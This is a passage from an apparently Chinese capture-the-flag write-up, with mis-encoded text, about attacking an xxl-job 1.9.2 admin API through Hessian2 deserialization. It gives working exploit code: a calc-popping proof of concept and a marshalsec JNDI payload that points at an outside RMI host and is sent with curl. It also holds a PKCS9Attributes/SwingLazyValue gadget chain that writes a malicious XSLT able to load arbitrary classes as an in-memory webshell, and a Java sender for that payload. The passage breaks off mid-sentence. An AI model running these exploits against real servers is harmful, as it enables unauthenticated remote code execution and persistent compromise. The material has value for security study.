Hessian2Input#expect<br></code></pre></td></tr></table></figure><p>ç„¶åæ˜¯åˆ†æè§¦å‘çš„ç‚¹</p><p>é¦–å…ˆæ˜¯readObjectæ–¹æ³•ä¸­ï¼Œä»–ä¼šè¯»å–ç¬¬ä¸€ä¸ªå­—èŠ‚æ•°æ®æ¥è¿›è¡Œåˆ¤æ–­</p><p><img src="https://cdn.clown2024.cn/image-20241126231943276.png" alt="image-20241126231943276"></p><p>ç„¶åå¦‚æœç¬¬ä¸€ä¸ªå­—èŠ‚ä¸ºå¤§å†™Cå³byteä¸º67çš„è¯ï¼Œå°±ä¼šè°ƒç”¨readObjectDefinitionæ–¹æ³•</p><p><img src="https://cdn.clown2024.cn/image-20241126232117755.png" alt="image-20241126232117755"></p><p>ç„¶åé‡Œé¢å°±ä¼šè°ƒç”¨readStringæ–¹æ³•</p><p><img src="https://cdn.clown2024.cn/image-20241126232145954.png" alt="image-20241126232145954"></p><p>ç„¶åreadStringä¹Ÿæ˜¯è¯»å–å­—èŠ‚æ¥è¿›è¡Œåˆ¤æ–­</p><p><img src="https://cdn.clown2024.cn/image-20241126232608979.png" alt="image-20241126232608979"></p><p>ä½†æ˜¯æˆ‘ä»¬å†™å…¥çš„æ˜¯å¯¹è±¡ç±»å‹ï¼Œæ‰€ä»¥ä¹Ÿä¸ç”¨è€ƒè™‘ä»–è¯»å–çš„ç¬¬äºŒä¸ªtagï¼Œæœ€ç»ˆä¸€å®šä¼šèµ°åˆ°defaulté‡Œé¢è§¦å‘expect</p><p><img src="https://cdn.clown2024.cn/image-20241126232816146.png" alt="image-20241126232816146"></p><h3 id="ç¼–å†™exp"><a href="#ç¼–å†™exp" class="headerlink" title="ç¼–å†™exp"></a>ç¼–å†™exp</h3><p>é‚£ç°åœ¨æˆ‘ä»¬éœ€è¦è€ƒè™‘çš„æ˜¯å¦‚ä½•æ§åˆ¶ç¬¬ä¸€ä¸ªå­—èŠ‚ï¼Œå¯ä»¥ä½¿ç”¨<strong>System.arraycopy</strong>æ–¹æ³•ï¼Œè¯¥æ–¹æ³•æ˜¯javaä¸­ç”¨æ¥å¤åˆ¶æ•°ç»„å…ƒç´ çš„æ–¹æ³•</p><p>å†™ä¸€ä¸ªPersonç±»é‡Œé¢çš„toStringæ–¹æ³•æœ‰æ¶æ„ä»£ç æ¥ç®€å•æµ‹è¯•</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.clown.exp;<br><br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.io.Serializable;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Person</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Serializable</span> &#123;<br>    String name;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setName</span><span class="hljs-params">(String name)</span> &#123;<br>        <span class="hljs-built_in">this</span>.name = name;<br>    &#125;<br><br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">toString</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            Runtime.getRuntime().exec(<span class="hljs-string">&quot;calc&quot;</span>);<br>        &#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(e);<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.name;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>ç„¶åæ˜¯exp</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.clown.exp;<br><br><br><span class="hljs-keyword">import</span> com.caucho.hessian.io.Hessian2Input;<br><span class="hljs-keyword">import</span> com.caucho.hessian.io.Hessian2Output;<br><span class="hljs-keyword">import</span> java.io.ByteArrayInputStream;<br><span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">expectExp</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">byte</span>[] Hessian2_Serial(Object o) <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">baos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">Hessian2Output</span> <span class="hljs-variable">hessian2Output</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Hessian2Output</span>(baos);<br>        hessian2Output.writeObject(o);<br>        hessian2Output.flushBuffer();<br>        <span class="hljs-keyword">return</span> baos.toByteArray();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">Hessian2_Deserial</span><span class="hljs-params">(<span class="hljs-type">byte</span>[] bytes)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">ByteArrayInputStream</span> <span class="hljs-variable">bais</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(bytes);<br>        <span class="hljs-type">Hessian2Input</span> <span class="hljs-variable">hessian2Input</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Hessian2Input</span>(bais);<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> hessian2Input.readObject();<br>        <span class="hljs-keyword">return</span> o;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br><br>        <span class="hljs-type">Person</span> <span class="hljs-variable">person</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>();<br>        person.setName(<span class="hljs-string">&quot;Hessianå¼‚å¸¸toStringæˆåŠŸæo(=â€¢ã‚§â€¢=)m&quot;</span>);<br><br>        <span class="hljs-type">byte</span>[] data = Hessian2_Serial(person);<br><br>        <span class="hljs-type">byte</span>[] poc = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[data.length + <span class="hljs-number">1</span>];<br>        System.arraycopy(<span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[]&#123;<span class="hljs-number">67</span>&#125;, <span class="hljs-number">0</span>, poc, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>); <span class="hljs-comment">//å…ˆå°†ç¬¬ä¸€ä¸ªå­—èŠ‚å¤åˆ¶ä¸º67</span><br>        System.arraycopy(data, <span class="hljs-number">0</span>, poc, <span class="hljs-number">1</span>, data.length); <span class="hljs-comment">//ç„¶åå°†dataå¤åˆ¶åˆ°åé¢</span><br>        Hessian2_Deserial(poc);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>æˆåŠŸå¼¹å‡ºè®¡ç®—å™¨</p><p><img src="https://cdn.clown2024.cn/image-20241126234432399.png" alt="image-20241126234432399"></p><h1 id="å¼€å§‹å¤ç°"><a href="#å¼€å§‹å¤ç°" class="headerlink" title="å¼€å§‹å¤ç°"></a>å¼€å§‹å¤ç°</h1><p>é¢˜ç›®å°±æ˜¯ä¸€ä¸ªxxl-jobçš„1.9.2çš„ç‰ˆæœ¬ï¼Œç‰ˆæœ¬æŒºä½çš„ï¼Œä¸€ä¸ªxxl-jobçš„æ€»ç»“ï¼Œå¤§éƒ¨åˆ†wpéƒ½æ˜¯çœ‹è¿™ä¸ªçš„ï¼š<a href="https://xz.aliyun.com/t/13899">https://xz.aliyun.com/t/13899</a></p><p>æ€»ç»“å°±æ˜¯xxl-jobä¸€èˆ¬æœ‰ä¸¤ä¸ªæ‰“æ³•ï¼Œä¸€ä¸ªæ˜¯æ‰“apiæœªæˆæƒï¼Œä¸€ä¸ªæ˜¯æ‰“executoræœªæˆæƒï¼Œè¯¥é¢˜æ‰“çš„å°±æ˜¯apiæœªæˆæƒè®¿é—®</p><h2 id="apiæœªæˆæƒæ‰“æ³•"><a href="#apiæœªæˆæƒæ‰“æ³•" class="headerlink" title="apiæœªæˆæƒæ‰“æ³•"></a>apiæœªæˆæƒæ‰“æ³•</h2><p>apiæœªæˆæƒï¼Œæ˜¯é’ˆå¯¹adminç»„ä»¶çš„ï¼Œè®¿é—®apiçš„æ—¶å€™ä¼šè¿”å›è¿™æ ·çš„å†…å®¹ï¼Œè¯æ˜è¿™æ˜¯å­˜åœ¨apiæœªæˆæƒ</p><p><img src="https://cdn.clown2024.cn/image-20241127000028369.png" alt="image-20241127000028369"></p><p>å¯ä»¥å»çœ‹çœ‹xxl-job-adminçš„æºç ä¸‹çš„apiè·¯ç”±éƒ½æ˜¯å¹²ä»€ä¹ˆçš„</p><p><img src="https://cdn.clown2024.cn/image-20241127000743175.png" alt="image-20241127000743175"></p><p>å¯ä»¥çœ‹åˆ°ä»–ä¼šè°ƒç”¨doInvokeæ–¹æ³•ï¼Œç„¶åç›´æ¥å°†bodyå…¨éƒ¨éƒ½ååºåˆ—åŒ–äº†</p><h3 id="æ‰“jndiæ³¨å…¥"><a href="#æ‰“jndiæ³¨å…¥" class="headerlink" title="æ‰“jndiæ³¨å…¥"></a>æ‰“jndiæ³¨å…¥</h3><p>ç„¶åå°±å¯ä»¥ç›´æ¥åˆ©ç”¨jndiï¼Œç”¨marshalsecç”Ÿæˆexpå»æ‰“</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">java -<span class="hljs-built_in">cp</span> marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.Hessian2 SpringAbstractBeanFactoryPointcutAdvisor rmi://x.x.x.x:1099/aaa &gt; test.ser<br></code></pre></td></tr></table></figure><p>ç”¨çš„æ˜¯SpringAbstractBeanFactoryPointcutAdvisorè¿™æ¡é“¾å­</p><p>ç„¶ååˆ©ç”¨curlå»å‘åŒ…å³å¯</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">curl -XPOST -H <span class="hljs-string">&quot;Content-Type: x-application/hessian&quot;</span> --data-binary @test.ser http://127.0.0.1:8080/api<br></code></pre></td></tr></table></figure><p>ä½†æ˜¯è¿™ç§æ‰“æ³•éœ€è¦ç¯å¢ƒå‡ºç½‘ï¼Œè¿™é‡Œé¢˜ç›®æ˜¯ä¸å‡ºç½‘çš„ï¼Œæ‰€ä»¥éœ€è¦æ¢ä¸€ç§æ–¹å¼å»æ‰“å†…å­˜é©¬</p><h3 id="xsltæ‰“å†…å­˜é©¬"><a href="#xsltæ‰“å†…å­˜é©¬" class="headerlink" title="xsltæ‰“å†…å­˜é©¬"></a>xsltæ‰“å†…å­˜é©¬</h3><p>XSLTï¼ˆeXtensible Stylesheet Language Transformationsï¼Œå¯æ‰©å±•æ ·å¼è¡¨è¯­è¨€è½¬æ¢ï¼‰æ˜¯ä¸€ç§ç”¨äºè½¬æ¢XMLæ–‡æ¡£çš„ç¼–ç¨‹è¯­è¨€ã€‚XSLTå®šä¹‰äº†å¦‚ä½•å°†ä¸€ä¸ªXMLæ–‡æ¡£è½¬æ¢æˆå¦ä¸€ç§æ ¼å¼ï¼Œæ¯”å¦‚HTMLã€æ–‡æœ¬æˆ–è€…å¦ä¸€ä¸ªXMLæ–‡æ¡£ã€‚</p><p>è¿™éƒ¨åˆ†çš„åˆ©ç”¨åœ¨Nookipopå¸ˆå‚…çš„æ–‡ç« ä¸­æœ‰è¯´ï¼Œé‡Œé¢ä¸€äº›Hessiançš„é“¾å­æ²¡è§è¿‡ï¼Œè¿˜ä¸´æ—¶å»è¡¥äº†ä¸€ä¸‹</p><p>å› ä¸ºä¸å‡ºç½‘å°±éœ€è¦æ‰“å†…å­˜é©¬ï¼Œæˆ‘ä»¬è¿™é‡Œéœ€è¦æ‰“ä¸¤æ¬¡payloadï¼Œç¬¬ä¸€æ¬¡å†™å…¥xsltæ–‡ä»¶ï¼Œç¬¬äºŒæ¬¡è§£æxsltæ–‡ä»¶æ‰“å…¥å†…å­˜é©¬</p><p>å…ˆåˆ©ç”¨Hessiançš„PKCS9Attributesè¿™æ¡åŸç”Ÿé“¾å­å†™ä¸€ä¸ªxsltæ–‡ä»¶èƒ½å¤Ÿæ‰§è¡Œä»»æ„ä»£ç </p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-comment">//Pkcs9å¯ä»¥æ¢æˆMimeTypeParameterList</span><br>        <span class="hljs-type">PKCS9Attributes</span> <span class="hljs-variable">pkcs9Attributes</span> <span class="hljs-operator">=</span> SerializeUtils.createWithoutConstructor(PKCS9Attributes.class);<br>        <span class="hljs-type">UIDefaults</span> <span class="hljs-variable">uiDefaults</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UIDefaults</span>();<br>        uiDefaults.put(PKCS9Attribute.EMAIL_ADDRESS_OID, <span class="hljs-keyword">new</span> <span class="hljs-title class_">SwingLazyValue</span>(<span class="hljs-string">&quot;com.sun.org.apache.xalan.internal.xslt.Process&quot;</span>, <span class="hljs-string">&quot;_main&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;<span class="hljs-string">&quot;-XT&quot;</span>, <span class="hljs-string">&quot;-XSL&quot;</span>, <span class="hljs-string">&quot;E:\\payload.xslt&quot;</span>&#125;&#125;));<br>        SerializeUtils.setFieldValue(pkcs9Attributes,<span class="hljs-string">&quot;attributes&quot;</span>,uiDefaults);<br>        <span class="hljs-type">FileOutputStream</span> <span class="hljs-variable">fileOut</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;poc.ser&quot;</span>);<br>        <span class="hljs-type">Hessian2Output</span> <span class="hljs-variable">out</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Hessian2Output</span>(fileOut);<br>        fileOut.write(<span class="hljs-number">67</span>);<br>        out.getSerializerFactory().setAllowNonSerializable(<span class="hljs-literal">true</span>);<br>        out.writeObject(pkcs9Attributes);<br>        out.close();<br>        fileOut.close();<br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>è¿™é‡Œæœ€åè°ƒç”¨çš„é™æ€æ–¹æ³•æ˜¯Process#_mainæ–¹æ³•ï¼Œè¯¥æ–¹æ³•èƒ½å¤Ÿè§£æxsltæ–‡ä»¶</p><p>èƒ½å¤Ÿæ‰§è¡Œä»»æ„ä»£ç çš„æ¶æ„xsltæ–‡ä»¶</p><figure class="highlight xml"><table><tr><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">xsl:stylesheet</span> <span class="hljs-attr">version</span>=<span class="hljs-string">&quot;1.0&quot;</span> <span class="hljs-attr">xmlns:xsl</span>=<span class="hljs-string">&quot;http://www.w3.org/1999/XSL/Transform&quot;</span></span><br><span class="hljs-tag">                <span class="hljs-attr">xmlns:b64</span>=<span class="hljs-string">&quot;http://xml.apache.org/xalan/java/sun.misc.BASE64Decoder&quot;</span></span><br><span class="hljs-tag">                <span class="hljs-attr">xmlns:ob</span>=<span class="hljs-string">&quot;http://xml.apache.org/xalan/java/java.lang.Object&quot;</span></span><br><span class="hljs-tag">                <span class="hljs-attr">xmlns:th</span>=<span class="hljs-string">&quot;http://xml.apache.org/xalan/java/java.lang.Thread&quot;</span></span><br><span class="hljs-tag">                <span class="hljs-attr">xmlns:ru</span>=<span class="hljs-string">&quot;http://xml.apache.org/xalan/java/org.springframework.cglib.core.ReflectUtils&quot;</span></span><br><span class="hljs-tag">&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">xsl:template</span> <span class="hljs-attr">match</span>=<span class="hljs-string">&quot;/&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">xsl:variable</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;bs&quot;</span> <span class="hljs-attr">select</span>=<span class="hljs-string">&quot;b64:decodeBuffer(b64:new(),&#x27;base64&#x27;)&quot;</span>/&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">xsl:variable</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;cl&quot;</span> <span class="hljs-attr">select</span>=<span class="hljs-string">&quot;th:getContextClassLoader(th:currentThread())&quot;</span>/&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">xsl:variable</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;rce&quot;</span> <span class="hljs-attr">select</span>=<span class="hljs-string">&quot;ru:defineClass(&#x27;classname&#x27;,$bs,$cl)&quot;</span>/&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">xsl:value-of</span> <span class="hljs-attr">select</span>=<span class="hljs-string">&quot;$rce&quot;</span>/&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">xsl:template</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">xsl:stylesheet</span>&gt;</span><br></code></pre></td></tr></table></figure><p>ç„¶åæˆ‘ä»¬è¿˜éœ€è¦ä¸€ä¸ªç”¨æ¥å†™å…¥çš„é™æ€æ–¹æ³•ï¼Œé€‰ç”¨JavaUtilsçš„writeBytesTofilename</p><p><img src="https://cdn.clown2024.cn/image-20241127211222432.png" alt="image-20241127211222432"></p><p>é‚£å°±å¯ä»¥å¾—åˆ°å¦ä¸€ä¸ªpayload</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.javasec.pocs.hessian;<br><span class="hljs-keyword">import</span> com.caucho.hessian.io.Hessian2Output;<br><span class="hljs-keyword">import</span> com.javasec.utils.SerializeUtils;<br><span class="hljs-keyword">import</span> sun.security.pkcs.PKCS9Attribute;<br><span class="hljs-keyword">import</span> sun.security.pkcs.PKCS9Attributes;<br><span class="hljs-keyword">import</span> sun.swing.SwingLazyValue;<br><br><span class="hljs-keyword">import</span> javax.swing.*;<br><span class="hljs-keyword">import</span> java.io.FileOutputStream;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">HessianProxyLVFileWrite</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-comment">//Pkcs9å¯ä»¥æ¢æˆMimeTypeParameterList</span><br>        <span class="hljs-type">PKCS9Attributes</span> <span class="hljs-variable">pkcs9Attributes</span> <span class="hljs-operator">=</span> SerializeUtils.createWithoutConstructor(PKCS9Attributes.class);<br>        <span class="hljs-type">UIDefaults</span> <span class="hljs-variable">uiDefaults</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UIDefaults</span>();<br>        <span class="hljs-comment">//PKCS9Attribute.EMAIL_ADDRESS_OID æ˜¯å›ºå®šçš„ï¼Œè°ƒè¯•æµç¨‹å¯ä»¥çœ‹åˆ°é€»è¾‘</span><br>        <span class="hljs-comment">//å»ä¿®æ”¹éœ€è¦è¯»å–çš„æ–‡ä»¶ï¼Œå’Œå†™å…¥çš„æ–‡ä»¶åï¼Œå®ä¾‹ä¸­æ˜¯è¯»å–1.txtå†™å…¥pwned.txt</span><br>        uiDefaults.put(PKCS9Attribute.EMAIL_ADDRESS_OID, <span class="hljs-keyword">new</span> <span class="hljs-title class_">SwingLazyValue</span>(<span class="hljs-string">&quot;com.sun.org.apache.xml.internal.security.utils.JavaUtils&quot;</span>, <span class="hljs-string">&quot;writeBytesToFilename&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;/tmp/1.xslt&quot;</span>,SerializeUtils.getFileBytes(<span class="hljs-string">&quot;E:\\payload.xslt&quot;</span>)&#125;));<br>        SerializeUtils.setFieldValue(pkcs9Attributes,<span class="hljs-string">&quot;attributes&quot;</span>,uiDefaults);<br>        <span class="hljs-type">FileOutputStream</span> <span class="hljs-variable">fileOut</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;poc.ser&quot;</span>);<br>        <span class="hljs-type">Hessian2Output</span> <span class="hljs-variable">out</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Hessian2Output</span>(fileOut);<br>        fileOut.write(<span class="hljs-number">67</span>);<br>        out.getSerializerFactory().setAllowNonSerializable(<span class="hljs-literal">true</span>);<br>        out.writeObject(pkcs9Attributes);<br>        out.close();<br>        fileOut.close();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>ç„¶åè¿™é‡Œå†™ä¸€ä¸ªexpèƒ½å¤Ÿåºåˆ—åŒ–payloadå¹¶å‘é€postè¯·æ±‚çš„</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.clown.exp;<br><br><span class="hljs-keyword">import</span> com.caucho.hessian.io.Hessian2Input;<br><span class="hljs-keyword">import</span> com.caucho.hessian.io.Hessian2Output;<br><span class="hljs-keyword">import</span> com.caucho.hessian.io.SerializerFactory;<br><span class="hljs-keyword">import</span> sun.security.pkcs.PKCS9Attribute;<br><span class="hljs-keyword">import</span> sun.security.pkcs.PKCS9Attributes;<br><span class="hljs-keyword">import</span> sun.swing.SwingLazyValue;<br><br><span class="hljs-keyword">import</span> javax.swing.*;<br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.net.HttpURLConnection;<br><span class="hljs-keyword">import</span> java.net.URL;<br><span class="hljs-keyword">import</span> java.net.URLConnection;<br><span class="hljs-keyword">import</span> java.nio.file.Files;<br><span class="hljs-keyword">import</span> java.nio.file.Paths;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">DasCTFEasyJob</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">byte</span>[] Hessian2_Serial(Object o) <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">baos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">Hessian2Output</span> <span class="hljs-variable">hessian2Output</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Hessian2Output</span>(baos);<br>        <span class="hljs-type">SerializerFactory</span> <span class="hljs-variable">serializerFactory</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SerializerFactory</span>();<br>        serializerFactory.setAllowNonSerializable(<span class="hljs-literal">true</span>);<br>        hessian2Output.setSerializerFactory(serializerFactory);<br>        hessian2Output.writeObject(o);<br>        hessian2Output.flushBuffer();<br>        <span class="hljs-keyword">return</span> baos.toByteArray();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">Hessian2_Deserial</span><span class="hljs-params">(<span class="hljs-type">byte</span>[] bytes)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">ByteArrayInputStream</span> <span class="hljs-variable">bais</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(bytes);<br>        <span class="hljs-type">Hessian2Input</span> <span class="hljs-variable">hessian2Input</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Hessian2Input</span>(bais);<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> hessian2Input.readObject();<br>        <span class="hljs-keyword">return</span> o;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setField</span><span class="hljs-params">(Object o, String fieldName, Object value)</span> <span class="hljs-keyword">throws</span> NoSuchFieldException, IllegalAccessException &#123;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">declaredField</span> <span class="hljs-operator">=</span> o.getClass().getDeclaredField(fieldName);<br>        declaredField.setAccessible(<span class="hljs-literal">true</span>);<br>        declaredField.set(o, value);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-comment">//Pkcs9å¯ä»¥æ¢æˆMimeTypeParameterList</span><br>        <span class="hljs-type">PKCS9Attributes</span> <span class="hljs-variable">pkcs9Attributes</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">PKCS9Attributes</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">PKCS9Attribute</span>[]&#123;&#125;);<br>        <span class="hljs-type">UIDefaults</span> <span class="hljs-variable">uiDefaults</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UIDefaults</span>();<br>        <span class="hljs-comment">//å»ä¿®æ”¹è¿™é‡Œå†™å…¥çš„æ–‡ä»¶åï¼Œä»¥åŠæ–‡ä»¶å†…å®¹</span><br>        uiDefaults.put(PKCS9Attribute.EMAIL_ADDRESS_OID, <span class="hljs-keyword">new</span> <span class="hljs-title class_">SwingLazyValue</span>(<span class="hljs-string">&quot;com.sun.org.apache.xml.internal.security.utils.JavaUtils&quot;</span>, <span class="hljs-string">&quot;writeBytesToFilename&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;/tmp/1.xslt&quot;</span>, Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;payload.xslt&quot;</span>))&#125;));<br>        setField(pkcs9Attributes,<span class="hljs-string">&quot;attributes&quot;</span>,uiDefaults);<br>        <span class="hljs-type">byte</span>[] data = Hessian2_Serial(pkcs9Attributes);<br><br>        <span class="hljs-type">byte</span>[] poc = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[data.length + <span class="hljs-number">1</span>];<br>        System.arraycopy(<span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[]&#123;<span class="hljs-number">67</span>&#125;, <span class="hljs-number">0</span>, poc, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>); <span class="hljs-comment">//å…ˆå°†ç¬¬ä¸€ä¸ªå­—èŠ‚å¤åˆ¶ä¸º67</span><br>        System.arraycopy(data, <span class="hljs-number">0</span>, poc, <span class="hljs-number">1</span>, data.length); <span class="hljs-comment">//ç„¶åå°†dataå¤åˆ¶åˆ°åé¢</span><br><span class="hljs-comment">//        Hessian2_Deserial(poc);</span><br>        <span class="hljs-comment">//å‘é€postè¯·æ±‚ï¼Œå› ä¸ºHessianè¦å‘é€åŸç”Ÿçš„åºåˆ—åŒ–æ•°æ®</span><br>        <span class="hljs-comment">//åˆ›å»ºurlå¯¹è±¡</span><br>        <span class="hljs-type">URL</span> <span class="hljs-variable">url</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>(<span class="hljs-string">&quot;http://127.0.0.1:8080/api&quot;</span>);<br>        <span class="hljs-type">HttpURLConnection</span> <span class="hljs-variable">connection</span> <span class="hljs-operator">=</span> (HttpURLConnection) url.openConnection();<br>        <span class="hljs-comment">// è®¾ç½®è¯·æ±‚æ–¹æ³•ä¸º POST</span><br>        connection.setRequestMethod(<span class="hljs-string">&quot;POST&quot;</span>);<br>        <span class="hljs-comment">// è®¾ç½®è¯·æ±‚å¤´</span><br>        connection.setRequestProperty(<span class="hljs-string">&quot;Content-Type&quot;</span>, <span class="hljs-string">&quot;application/octet-stream&quot;</span>);<br>        <span class="hljs-comment">// å…è®¸è¾“å‡º</span><br>        connection.setDoOutput(<span class="hljs-literal">true</span>);<br>        <span class="hljs-comment">//è®¾ç½®è¯·æ±‚ä½“</span><br>        <span class="hljs-type">OutputStream</span> <span class="hljs-variable">outputStream</span> <span class="hljs-operator">=</span> connection.getOutputStream();<br>        outputStream.write(poc);<br>        <span class="hljs-comment">// è·å–å“åº”ç </span><br>        <span class="hljs-type">int</span> <span class="hljs-variable">responseCode</span> <span class="hljs-operator">=</span> connection.getResponseCode();<br>        System.out.println(<span class="hljs-string">&quot;Response Code: &quot;</span> + responseCode);<br>        <span class="hljs-comment">// å…³é—­è¿æ¥</span><br>        connection.disconnect();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/image-20241127214635292.png" alt="image-20241127214635292"></p><blockquote><p>æ¬¸æˆ‘æœäº†æ‰“äº†å‡ æ¬¡æ²¡ååº”ï¼Œçœ‹äº†ä¸€ä¸‹å®¹å™¨æ—¥å¿—ï¼Œè¯´java.lang.ClassNotFoundException: 